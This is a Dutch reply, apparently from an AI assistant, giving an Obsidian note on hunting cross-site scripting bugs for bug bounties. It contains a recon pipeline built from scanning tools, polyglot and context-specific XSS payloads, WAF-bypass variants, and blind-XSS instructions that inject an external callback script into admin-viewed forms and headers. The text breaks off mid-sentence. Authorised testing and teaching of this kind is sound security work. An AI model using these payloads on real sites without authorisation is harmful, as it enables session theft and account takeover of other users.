
Hier is de complete, uitgebreide Obsidian notitie voor **Cross-Site Scripting (XSS)**.

Dit is verreweg de meest voorkomende bug. Ik heb deze notitie zo ingericht dat je van **massa-scan** (automatisering) naar **handmatige exploitatie** (precisiewerk) gaat.

Kopieer dit blok direct in je vault:

Markdown

````
# ⚔️ Cross-Site Scripting (XSS)

==Doel: JavaScript code uitvoeren in de browser van het slachtoffer.==
*Impact: Account overname (cookies stelen), phishing, redirects.*



---

## 🏗️ 1. Types XSS

> [!INFO] De Drie Varianten
> 1.  **Reflected:** Je stuurt een link (`?q=<script>...`). Slachtoffer klikt -> script runt. (Meest voorkomend).
> 2.  **Stored:** Je slaat code op in de database (comment, profiel). Iedereen die de pagina laadt wordt gehackt. (Gevaarlijkst).
> 3.  **DOM-based:** De aanval gebeurt puur in de browser (JavaScript), de server ziet de payload nooit.

---

## 🔎 2. Recon & Discovery (Automated Pipeline)
*Vind parameters die input reflecteren op de pagina.*

**Stap 1: URL's verzamelen (Wayback + Gau)**
```bash
# Verzamelt URL's en filtert op parameters
waymore -i target.com -mode U | grep "=" > urls.txt
````

**Stap 2: Live Check & Filteren (GF & Httpx)** _Gebruik GF (Grep Fuzz) patronen om XSS-gevoelige parameters te vinden._

Bash

```
cat urls.txt | gf xss | httpx -silent > potential_xss.txt
```

**Stap 3: Reflectie Testen (KXSS)** _KXSS checkt of speciale karakters (`< > " '`) worden gereflecteerd en niet gefilterd._

Bash

```
cat potential_xss.txt | kxss
```

**Stap 4: Scannen met Dalfox (De "King" van XSS)** _Dalfox is slim en checkt automatisch op WAF bypasses._

Bash

```
# Single URL
dalfox url "[http://target.com/search?q=test](http://target.com/search?q=test)"

# File Scan (De output van KXSS of URLs)
dalfox file potential_xss.txt -b your-blind-xss.xss.ht --mining-dict
```

---

## 💉 3. Manual Payloads (Cheatsheet)

_Als scanners falen, moet je handmatig proberen te breken. Kijk in de broncode (Ctrl+U) waar je input terechtkomt._

### De Klassiekers (Polyglots)

_Polyglots breken uit meerdere contexten tegelijk (attribuut, script tag, html)._

Plaintext

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Plaintext

```
javascript://%250Aalert(1)//"/*\'/*"/*--></Script><Image Src=x OnError=alert(1)>
```

### Context Specifiek

**1. In HTML Body:** `<div>...JOUW INPUT...</div>`

HTML

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
```

**2. In een Attribuut:** `<input value="JOUW INPUT">` _Je moet eerst de quote sluiten._

Plaintext

```
" onfocus=alert(1) autofocus="
"><img src=x onerror=alert(1)>
```

**3. In JavaScript:** `<script>var x = 'JOUW INPUT';</script>` _Je moet de string en het script sluiten._

Plaintext

```
'; alert(1); //
</script><script>alert(1)</script>
```

---

## 🛡️ 4. WAF Bypass & Filters

_De server blokkeert `<script>` of `alert`? Probeer dit._

**Case Sensitivity:** De filter zoekt `script`, maar niet `ScRiPt`.

HTML

```
<ScRiPt>alert(1)</sCrIpT>
<ImG sRc=x oNeRrOr=alert(1)>
```

**Tag Injection (zonder spaties):** Soms blokkeert de WAF spaties. Gebruik slashes.

HTML

```
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

**Event Handlers (Alternatieven voor `alert`):** Soms is `alert()` geblokkeerd.

JavaScript

```
prompt(1)
confirm(1)
print()
```

**Double Encoding:**

Plaintext

```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

---

## 🦇 5. Blind XSS

_Voor input die je zelf niet direct ziet (bijv. "Contact Us" formulier dat door een admin wordt gelezen)._

1. Ga naar **XSS Hunter** (of gebruik `bxsshunter` / `interactsh`).
    
2. Kopieer je unieke payload (ziet eruit als `<script src=//x.ss/s></script>`).
    
3. Injecteer dit in:
    
    - Feedback formulieren
        
    - User-Agent Header
        
    - Support tickets
        
    - Adresgegevens (Logistieke apps)
        
4. Wacht op e-mail. Als de admin het opent -> **BOOM (Critical Bounty)**.
    

---

## 📝 Checklist XSS

- [ ] **Parameters:** Heb ik alle inputs (ook hidden fields) getest?
    
- [ ] **Headers:** Heb ik XSS in `User-Agent` of `Referer` getest?
    
- [ ] **Reflectie:** Komen mijn tekens terug in de source?
    
- [ ] **Encoding:** Heb ik URL-encode en HTML-entities geprobeerd?
    
- [ ] **Browsers:** Heb ik getest in Firefox én Chrome? (Gedragen zich soms anders).
    

```

### Tip voor je workflow
Als je handmatig test in de browser, typ dan nooit `alert(1)`.
Typ een unieke string, bijvoorbeeld `hacker123`.
Kijk daarna in de broncode (Ctrl+F) en zoek naar `hacker123`. Dan zie je precies **
```